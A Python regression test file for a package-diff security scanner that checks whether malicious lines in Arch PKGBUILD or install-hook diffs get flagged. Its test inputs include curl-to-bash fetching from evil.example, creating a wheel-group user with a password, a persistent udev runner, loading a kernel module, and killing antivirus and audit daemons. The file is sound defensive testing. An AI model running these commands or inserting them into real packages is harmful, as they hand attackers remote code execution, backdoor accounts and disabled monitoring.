"""Regression cases for command-prefix and system-surface bypasses."""

from trustsight.analysis import scan_diff
from trustsight.config import load_config, load_rules


def _score(line: str, file_name: str = "PKGBUILD") -> tuple[int, set[str]]:
    if file_name == "PKGBUILD":
        text = (
            "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
            " pkgname=x\n pkgver=1\n+package() {\n"
            f"+  {line}\n+}}\n"
        )
    else:
        text = (
            f"--- a/{file_name}\n+++ b/{file_name}\n@@ -1,2 +1,3 @@\n"
            " post_install() {\n"
            f"+  {line}\n }}\n"
        )
    fact = scan_diff(
        text, rules=load_rules(), config=load_config(), package_name="x")
    return fact.final_score, {entry.rule_id for entry in fact.score_breakdown}


def test_builtin_and_absolute_path_process_substitution_still_execute():
    for line in (
        "command bash <(command curl -s https://evil.example/x.sh)",
        "/usr/bin/bash <(/usr/bin/curl -s https://evil.example/x.sh)",
    ):
        score, rules = _score(line)
        assert score >= 80
        assert "H075" in rules


def test_privileged_account_and_password_are_not_clean():
    for line in ("useradd -G wheel -m evil", "echo 'evil:pass' | chpasswd"):
        score, rules = _score(line)
        assert score >= 25
        assert "S009" in rules


def test_udev_runner_is_not_clean_in_package_or_install_hook():
    line = (
        "echo 'SUBSYSTEM==\"usb\", RUN+=\"/usr/bin/evil\"' "
        "> /etc/udev/rules.d/99-evil.rules"
    )
    for file_name in ("PKGBUILD", "pkg.install"):
        score, rules = _score(line, file_name)
        assert score >= 25
        assert "S009" in rules


def test_modprobe_in_package_and_pkill_av_are_not_clean():
    for line, rule in (("modprobe evilmod", "S010"),
                       ('pkill -f "clamd|auditd"', "S006")):
        score, rules = _score(line)
        assert score >= 25
        assert rule in rules
